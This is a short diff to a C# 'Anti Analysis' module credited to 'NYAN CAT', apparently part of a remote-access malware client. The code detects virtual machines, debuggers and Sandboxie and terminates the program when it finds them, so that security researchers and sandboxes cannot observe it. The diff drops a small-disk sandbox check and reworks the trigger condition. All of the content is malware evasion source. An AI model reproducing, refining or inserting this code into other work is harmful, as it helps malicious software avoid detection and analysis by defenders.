@@ -1,11 +1,7 @@
 ﻿using Client.Handle_Packet;
 using System;
 using System.Diagnostics;
-using System.IO;
-using System.Linq;
 using System.Management;
-using System.Net.NetworkInformation;
-using System.Runtime.InteropServices;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Anti Analysis v0.2.1
@@ -21,20 +17,9 @@ namespace Client.Helper
     {
         public static void RunAntiAnalysis()
         {
-            if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
+            bool vmIndicators = DetectManufacturer() || DetectDebugger() || DetectSandboxie();
+            if (vmIndicators || IsXP())
                 Environment.FailFast(null);
-        }
-
-        private static bool IsSmallDisk()
-        {
-            try
-            {
-                long GB_60 = 61000000000;
-                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
-                    return true;
-            }
-            catch { }
-            return false;
         }
 
         private static bool IsXP()
